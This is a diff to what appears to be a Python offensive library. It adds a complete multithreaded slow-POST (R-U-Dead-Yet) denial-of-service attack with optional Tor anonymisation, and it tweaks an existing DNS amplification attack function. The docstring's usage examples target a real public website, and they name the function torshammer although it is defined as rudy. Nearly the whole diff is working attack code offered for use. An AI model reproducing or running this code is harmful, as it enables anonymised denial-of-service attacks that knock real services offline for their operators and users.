@@ -777,6 +777,123 @@ def proxhammer(u,p=80,threads=700,maxtime=5,httpl=None,socks4l=None,socks5l=None
   except KeyboardInterrupt:
    stop=True
    break
+class rudypost(threading.Thread):
+ def run(self):
+  self.r_wait=r_wait
+  self.r_max=r_max
+  self.r_min=r_min
+  self.form_lng=form_lng
+  self.max_fo=max_fo
+  self.min_fo=min_fo
+  self.fo=fo
+  self.pag=pag
+  self.target=target
+  self.port=port
+  self.timeout=timeout
+  self.tor=tor
+  time.sleep(2)
+  while (stop!=True):
+   try:
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    if self.tor==False:
+     s.settimeout(self.timeout)
+    if tor==True:
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
+    s.connect((self.target,self.port))
+    if prints==True:
+     print("Connected to {}:{}...".format(self.target,self.port))
+    if ((self.port==443) or (self.port==8443)):
+     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
+    if self.form_lng<1:
+     q=random.randint(self.min_fo,self.max_fo)
+    else:
+     q=self.form_lng
+    s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(self.pag,random.choice(ua),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target))
+    rud='{}='.format(self.fo)
+    s.send(rud.encode('utf-8'))
+    for i in range(q):
+     if stop==True:
+      break
+     h=random.choice(lis)
+     try:
+      s.send(h.encode('utf-8'))
+      if prints==True:
+       print("Posted: {}".format(h))
+      if self.r_wait<0:
+       time.sleep(random.randint(self.r_min,self.r_max))
+      else:
+       time.sleep(self.r_wait)
+     except:
+      break
+    s.close()
+   except:
+    pass
+   time.sleep(.1)
+   if stop==True:
+    break
+def rudy(u,p=80,threads=500,form='q',form_len=0,max_form=1000000,min_form=10000,page='/',maxtime=5,settor=False,interval=300,logs=True,wait=-1,max_wait=5,min_wait=1):
+ '''
+    this function is used to do torshammer attack, it connects to an ip or domain with a specific port, sends a POST request with legit http headers values then sends the body slowly to keep the socket open as long as possible. it can use tor as a proxy to anonimize the attack. it supports ssl connections unlike the original tool and some bugs has been fixed and simplified.
+    
+    it takes those parameters:
+
+    u: the target ip or domain
+    p: (set by default to: 80) the targeted port
+    threads: (set by default to: 500) number of connections to be created
+    maxtime: (set by default to: 5) connection timeout flag value
+    settor: (set by default to: False) if you want to use tor as SOCKS5 proxy after activating it you must set this parameter to: True
+
+    example:
+
+    >>>import bane
+    >>>bane.torshammer('www.google.com',p=80)
+
+    >>>bane.torshammer('www.google.com',p=80,settor=True)
+
+'''
+ global r_wait
+ r_wait=wait
+ global r_max
+ r_max=max_wait
+ global r_min
+ r_min=min_wait
+ global form_lng
+ form_lng=form_len
+ global pag
+ pag=page
+ global fo
+ fo=form
+ global max_fo
+ max_fo=max_form
+ global min_fo
+ min_fo=min_form
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global timeout
+ timeout=maxtime
+ global tor
+ tor=settor
+ for x in range(threads):
+     t =rudypost()
+     t.start()
+ c=time.time()
+ while True:
+  if stop==True:
+   break
+  try:
+   time.sleep(.1)
+   if int(time.time()-c)==interval:
+    stop=True
+    break
+  except KeyboardInterrupt:
+   stop=True
+   break
 class xer(threading.Thread):
  def run(self):
   x=pointer
@@ -2179,9 +2296,13 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ANY',interval=300,logs=True,retur
  global port
  port=p
  global dnsl
+ dnsl=[]
  dnsl=dnslist
  if dnsl==[]:
-  dnsl=get_public_dns()
+  dns1=get_public_dns()
+  for x in dns1:
+   if '.' in x:
+    dnsl.append(x)
  global query
  query=q
  wh=0
